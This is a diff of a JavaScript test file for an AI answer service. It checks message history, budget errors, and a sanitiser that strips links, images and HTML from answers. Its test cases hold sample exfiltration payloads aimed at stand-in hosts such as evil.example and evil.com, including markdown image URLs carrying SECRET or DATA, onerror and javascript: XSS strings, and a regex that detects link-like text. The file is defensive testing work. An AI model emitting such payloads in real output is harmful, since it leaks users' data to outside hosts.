@@ -304,7 +304,7 @@ test('follow-ups carry the last ten turns as plain text, capped in length', asyn
   assert.strictEqual(msgs[0].role, 'user');
   assert.match(msgs[0].content[0].text, /<project_context>/);
   assert.deepStrictEqual(msgs[0].content[1], { type: 'text', text: 'q2' });
-  assert.deepStrictEqual(msgs[20], { role: 'user', content: 'How is billing handled?' });
+  assert.deepStrictEqual(msgs[20], { role: 'user', content: [{ type: 'text', text: 'How is billing handled?' }] });
   assert.strictEqual(msgs[19].content.length, LIMITS.historyChars);
   assert.deepStrictEqual(historyMessages([{ question: 'q', answer: null }]), []);
 });
@@ -312,7 +312,7 @@ test('follow-ups carry the last ten turns as plain text, capped in length', asyn
 test('links, images and HTML are taken out of answers; progress text is shortened', async () => {
   const { row } = await ask([answerJson({ paragraphs: [{ text: 'See ![x](https://evil.example/p.png?d=SECRET) [the docs](https://evil.example/?q=1) <img src=x onerror=alert(1)> or javascript:alert(1) now.', source_ids: [RULE] }] })]);
   const t = row.claims.paragraphs[0].text;
-  assert.ok(!/https?:|<|javascript:|SECRET/.test(t), t);
+  assert.ok(!/https?:|<[a-z]|javascript:|SECRET/i.test(t), t);
   assert.match(t, /the docs/);
   assert.strictEqual(cleanParagraph('[a](b) c'), 'a c');
   assert.ok(progressText('read_file', { path: 'x'.repeat(200) }).length <= 60 + 'Reading '.length);
@@ -371,7 +371,14 @@ test('mid-answer, a spend that can’t be read or a person’s monthly ceiling s
   const askMessages = { ...fakeMessages(), usage: async () => ({ spentThisMonth: 1, spentByUserThisMonth: 40, spentAllThisMonth: 50 }) };
   const { tools } = setup();
   const row = await runQuestion({ project, question: 'q', config: { ...config, userMonthlyUsd: 40, globalMonthlyUsd: 300 }, answer: { id: 'a1', user_id: 'u2' }, deps: { askMessages, client, createTools: () => tools } });
-  assert.deepStrictEqual([row.status, row.error, row.content], ['failed', 'monthly_budget', MESSAGES.budget]);
+  assert.deepStrictEqual([row.status, row.error, row.content], ['failed', 'user_budget', MESSAGES.user_budget]);
+});
+
+test('with one round allowed, the question itself carries the final-round note', async () => {
+  const { requests } = await ask([answerJson({ paragraphs: [{ text: 'Billing uses Stripe.', source_ids: [RULE] }] })], { cfg: { ...config, maxRounds: 1 } });
+  assert.deepStrictEqual(requests[0].tool_choice, { type: 'none' });
+  const turn = requests[0].messages[0].content;
+  assert.deepStrictEqual(turn[turn.length - 1], { type: 'text', text: FINAL_ROUND_NOTE });
 });
 
 test('an answer that couldn’t be saved is not shown as done', async () => {
@@ -393,11 +400,28 @@ test('nothing in an answer or a source can become a link, image or tag when rend
     'mail mailto:x@evil.com?d=DATA and ftp://evil.com/DATA and HTTPS://EVIL.COM/DATA',
     'data:text/html;base64,DATA',
   ];
-  for (const c of cases) {
+  // What a GFM renderer could turn into a link, image, tag or autolink.
+  const linkish = (t) => /!\[|\]\(|\]\[|\]:|<[a-z!/?]|\bwww\.|[a-z]+:[\\/]{2}|\bjavascript:|\bdata:|\w@\w/i.test(t);
+  const nasty = [
+    ...cases,
+    '[a [b] c](/\\evil.com/x)',
+    '![a [b] c](/\\evil.com/p.png?q=secret)',
+    '[a\\]b](/\\evil.com)',
+    '[a [b] c](https:\\\\evil.com)',
+    '[a\nb]: /\\evil.com\n![a b] and [a b]',
+    'write to foo@evil.com',
+    '<https://evil.com/?d=DATA> and <a href="x">y</a> and <!-- c --> and </script>',
+    '[x]\n[x]: <//evil.com>',
+  ];
+  for (const c of nasty) {
     const t = cleanParagraph(c);
-    assert.ok(!/DATA|evil|<|\]:|\/\//.test(t), `${JSON.stringify(c)} -> ${JSON.stringify(t)}`);
+    assert.ok(!linkish(t), `${JSON.stringify(c)} -> ${JSON.stringify(t)}`);
+    assert.ok(!/DATA/.test(t), `${JSON.stringify(c)} -> ${JSON.stringify(t)}`);
   }
-  assert.strictEqual(cleanParagraph('a > b and the docs'), 'a  b and the docs');
+  // Ordinary prose and code words survive.
+  assert.strictEqual(cleanParagraph('a < b and c > d'), 'a < b and c > d');
+  assert.strictEqual(cleanParagraph('It returns Array<string> from src/a.js.'), 'It returns Array< string> from src/a.js.');
+  assert.strictEqual(cleanParagraph('See the [docs](https://e.com) for "x".'), 'See the docs for "x".');
   const sources = new Map([
     [RULE, { kind: 'plan', sha: 'c'.repeat(40), area: 'billing ![i](//e.com/x)', text: 'Rule ![i](https://e.com/?d=1) text' }],
     ['agr_x', { kind: 'agreement', text: 'See www.e.com/x', status: 'accepted' }],
